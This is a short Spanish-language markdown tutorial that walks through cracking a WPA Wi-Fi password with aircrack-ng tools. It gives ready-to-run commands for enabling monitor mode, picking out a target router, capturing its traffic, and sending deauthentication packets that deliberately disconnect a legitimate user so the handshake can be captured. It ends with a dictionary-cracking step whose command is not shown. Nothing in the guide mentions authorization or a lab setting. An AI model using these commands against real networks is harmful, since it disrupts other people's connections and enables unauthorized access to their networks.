
```markdown
### Paso A: Activar Modo Monitor

Matamos procesos que estorben y activamos la escucha.

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# Ahora tu interfaz se llama wlan0mon
```

### Paso B: Escanear el Aire

Buscamos el objetivo (BSSID) y su canal.

```bash
sudo airodump-ng wlan0mon
```

### Paso C: Capturar el Tráfico

Empezamos a grabar todo lo que pasa en ese canal específico hacia un archivo `.cap`.

```bash
# -c: canal, --bssid: MAC del router, -w: nombre del archivo
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura_wifi wlan0mon
```

### Paso D: El Ataque de Desautenticación (Deauth)

Si nadie se conecta, no hay *handshake*. Expulsamos a un usuario legítimo para forzarlo a reconectarse automáticamente y capturar el saludo.

```bash
# -0 10: enviar 10 paquetes de desconexión
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Paso E: Cracking (Fuerza Bruta)

Una vez tenemos el *handshake* en el archivo `.cap`, usamos un diccionario (lista de palabras) para encontrar la clave.
```
